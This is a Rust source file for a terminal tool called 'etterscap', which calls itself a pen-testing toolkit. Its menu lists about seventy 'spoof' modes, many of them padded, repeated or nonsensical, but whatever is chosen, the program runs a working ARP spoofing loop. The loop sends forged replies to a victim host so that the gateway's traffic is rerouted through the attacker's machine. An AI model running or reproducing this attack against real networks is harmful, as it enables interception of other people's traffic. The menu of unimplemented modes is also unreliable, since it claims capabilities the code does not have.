use colored::Colorize;
use pnet::datalink::{self, Channel::Ethernet, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::fs;
use std::io::{self, Write};
use std::net::Ipv4Addr;
use std::process::Command;
use std::str::FromStr;
use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode},
    execute, terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen}
};
use ratatui::{backend::CrosstermBackend, widgets::*, Terminal, style::{Style, Modifier}, layout::Margin};
use std::time::Duration;

fn select_mode() {
    println!("{}", "THIS TOOL IS ONLY FOR PENETRATION TESTING AND NOT FOR ILLEGAL PURPOSES".red().bold().underline());
    println!("{}", "ABUSE IS GOING TO BE PUNISHED!!!".red().bold().underline());
    println!("{}", "Available modes:".green().bold());

    let modes = vec![
        "ARP Spoof",
        "DNS Spoof",
        "DHCP Spoof",
        "NBNS Poison",
        "LLMNR Spoofer",        "HTTP Spoof",
        "HTTPS Spoof",
        "FTP Spoof",
        "SSH Spoof",
        "Telnet Spoof",
        "SMTP Spoof",
        "POP3 Spoof",
        "IMAP Spoof",
        "SMB Spoof",
        "RDP Spoof",
        "VNC Spoof",
        "X11 Spoof",
        "SNMP Spoof",
        "NTP Spoof",
        "Syslog Spoof",
        "NetBIOS Spoof",
        "MDNS Spoof",
        "SSDP Spoof",
        "UPnP Spoof",
        "IGMP Spoof",
        "MLD Spoof",
        "CDP Spoof",
        "LLDP Spoof",
        "EIGRP Spoof",
        "OSPF Spoof",
        "BGP Spoof",
        "RIP Spoof",
        "IS-IS Spoof",
        "HSRP Spoof",
        "VRRP Spoof",
        "GLBP Spoof",
        "STP Spoof",
        "RSTP Spoof",
        "MSTP Spoof",
        "PVST+ Spoof",
        "RPVST+ Spoof",
        "MSTP Spoof",
        "VTP Spoof",
        "DTP Spoof",
        "PAGP Spoof",
        "LACP Spoof",
        "BFD Spoof",
        "CFM Spoof",
        "OAM Spoof",
        "MPLS Spoof",
        "VPLS Spoof",
        "VPWS Spoof",
        "L2TP Spoof",
        "PPTP Spoof",
        "GRE Spoof",
        "IPsec Spoof",
        "SSL/TLS Spoof",
        "SSH Spoof",
        "VPN Spoof",
        "Proxy Spoof",
        "NAT Spoof",
        "Firewall Spoof",
        "IDS/IPS Spoof",
        "WAF Spoof",
        "DLP Spoof",
        "NAC Spoof",
        "SIEM Spoof",
        "SOC Spoof",
        "Threat Intelligence Spoof",
        "ICMP Redirection",
        "DoS Attack"
    ];
    let mut selected_index = 0;

    enable_raw_mode().unwrap();
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture).unwrap();
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend).unwrap();

    loop {
        terminal.draw(|f| {
            let size = f.size();
            let block = Block::default()
                .title("etterscap - Select Mode")
                .borders(Borders::ALL);
            f.render_widget(block, size);

            let list_items: Vec<ListItem> = modes
                .iter()
                .enumerate()
                .map(|(i, mode)| {
                    let content = if i == selected_index {
                        format!("> {}", mode).green().bold().to_string()
                    } else {
                        format!("  {}", mode).red().bold().to_string()
                    };
                    ListItem::new(content)
                })
                .collect();

            let list = List::new(list_items)
                .block(Block::default().title("Available Modes").borders(Borders::NONE))
                .highlight_style(Style::default().add_modifier(Modifier::BOLD));

            f.render_widget(list, size.inner(Margin { vertical: 1, horizontal: 1 }));
        }).unwrap();

        if event::poll(Duration::from_millis(100)).unwrap() {
            if let Event::Key(key) = event::read().unwrap() {
                match key.code {
                    KeyCode::Up => selected_index = selected_index.saturating_sub(1),
                    KeyCode::Down => selected_index = (selected_index + 1).min(modes.len() - 1),
                    KeyCode::Enter => {
                        disable_raw_mode().unwrap();
                        execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture).unwrap();
                        terminal.show_cursor().unwrap();
                        println!("{}", format!("{} mode selected.", modes[selected_index]).green().bold());
                        return;
                    }
                    _ => {}
                }
            }
        }
    }
}

fn find_mac(interface: &str, ip: &str, label: &str) -> Option<MacAddr> {
    let output = Command::new("arp-scan")
        .arg("-I")
        .arg(interface)
        .arg(ip)
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        if line.starts_with(ip) {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() >= 2 {
                println!("{} MAC: {}", label, fields[1]);
                return MacAddr::from_str(fields[1]).ok();
            }
        }
    }
    let arp_table = fs::read_to_string("/proc/net/arp").ok()?;
    for line in arp_table.lines().skip(1) {
        let fields: Vec<&str> = line.split_whitespace().collect();
        if fields.get(0) == Some(&ip) && fields.len() >= 4 {
            println!("{} MAC (from ARP cache): {}", label, fields[3]);
            return MacAddr::from_str(fields[3]).ok();
        }
    }
    None
}

fn main() {
    println!("{}", "Welcome to etterscap, your pen testing toolkit written in rust.".green().bold());
    select_mode();
    println!("{}" ,"------------------------\n#######next step:#######\n------------------------\n".yellow().bold());
    println!("{}", "Available interfaces:".green().bold());
    for iface in pnet::datalink::interfaces() {
        println!("{}", iface.name.red().bold());
    }
    print!("Interface: ");
    io::stdout().flush().unwrap();
    let mut iface = String::new();
    io::stdin().read_line(&mut iface).unwrap();
    let iface = iface.trim();

    print!("Victim IP: ");
    io::stdout().flush().unwrap();
    let mut victim_ip = String::new();
    io::stdin().read_line(&mut victim_ip).unwrap();
    let victim_ip = victim_ip.trim();
    let victim_ip_addr: Ipv4Addr = victim_ip.parse().unwrap();

    print!("Gateway IP: ");
    io::stdout().flush().unwrap();
    let mut gateway_ip = String::new();
    io::stdin().read_line(&mut gateway_ip).unwrap();
    let gateway_ip = gateway_ip.trim();
    let gateway_ip_addr: Ipv4Addr = gateway_ip.parse().unwrap();

    let attacker_mac = mac_address::mac_address_by_name(iface).unwrap().unwrap().bytes();
    let attacker_mac = MacAddr::new(attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);

    let victim_mac = find_mac(iface, victim_ip, "Victim").expect("Victim MAC not found. Is the host up?");
    let gateway_mac = find_mac(iface, gateway_ip, "Gateway").expect("Gateway MAC not found. Is the host up?");

    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(|i| i.name == iface).expect("Interface not found");
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _)) => (tx, ()),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };
    loop {
        let mut arp_buffer = [0u8; 28];
        let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Reply);
        arp_packet.set_sender_hw_addr(attacker_mac);
        arp_packet.set_sender_proto_addr(gateway_ip_addr);
        arp_packet.set_target_hw_addr(victim_mac);
        arp_packet.set_target_proto_addr(victim_ip_addr);

        let mut ethernet_buffer = [0u8; 42];
        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
        ethernet_packet.set_destination(victim_mac);
        ethernet_packet.set_source(attacker_mac);
        ethernet_packet.set_ethertype(EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());
        tx.send_to(ethernet_packet.packet(), None);
    }
}
